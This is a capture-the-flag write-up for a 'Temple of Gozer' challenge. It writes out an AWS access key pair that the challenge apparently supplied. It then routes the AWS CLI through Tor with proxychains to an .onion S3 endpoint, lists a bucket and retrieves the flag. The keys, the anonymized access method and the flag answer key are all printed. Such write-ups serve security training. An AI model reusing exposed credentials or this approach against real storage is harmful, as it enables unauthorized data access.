# Temple of Gozer

## Points 250

Find the Temple of Gozer

Consult with the KeyMaster and the GateKeeper to find your path.

(Don't destroy any files here or points will be deducted - Gozer is an angry god)

(You get to break one of the CTF rules for this challenge. Look at you, rebel.)

## Answer

```
@ https://areyouthekeymaster.h4110w33n.com

$HOME/.aws/credentials:
    [ctf]
    aws_access_key_id = WAH2B1B0ICX0VMC4WJV9
    aws_secret_access_key = 87cCrcOaz10e5SAEXgkGzIvZJsZ6GSFesnjXuXHf

@ https://www.devdungeon.com/content/making-tor-requests-command-line-curl
curl --socks5-hostname 127.0.0.1:9050 -ksL http://httpbin.org/ip

@ https://blog.csdn.net/mingjie1212/article/details/51814421
git clone --recursive https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng
./configure --prefix=/usr --sysconfdir=/etc
make && sudo make install && sudo make install-config

proxychains4 aws --profile ctf --endpoint-url http://jvfddhyduzmc4rhw.onion:9000 s3 ls
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
2018-09-26 01:12:06 security-pumpkin

proxychains4 aws --profile ctf --endpoint-url http://jvfddhyduzmc4rhw.onion:9000 s3api list-objects --bucket security-pumpkin
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
{
    "Contents": [
        {
            "LastModified": "2018-09-25T17:11:40.044Z",
            "ETag": "\"00000000000000000000000000000000-1\"",
            "StorageClass": "STANDARD",
            "Key": "flag.txt",
            "Owner": {
                "DisplayName": "",
                "ID": "02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4"
            },
            "Size": 38
        }
    ]
}

proxychains4 aws --profile ctf --endpoint-url http://jvfddhyduzmc4rhw.onion:9000 s3api get-object --bucket security-pumpkin --key flag.txt flag.txt
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
{
    "AcceptRanges": "bytes",
    "ContentType": "text/plain",
    "LastModified": "Tue, 25 Sep 2018 17:11:40 GMT",
    "ContentLength": 38,
    "ETag": "\"00000000000000000000000000000000-1\"",
    "Metadata": {}
}

$ cat flag.txt
flag-e782f102531da617037fe3bfd80cbe99
```
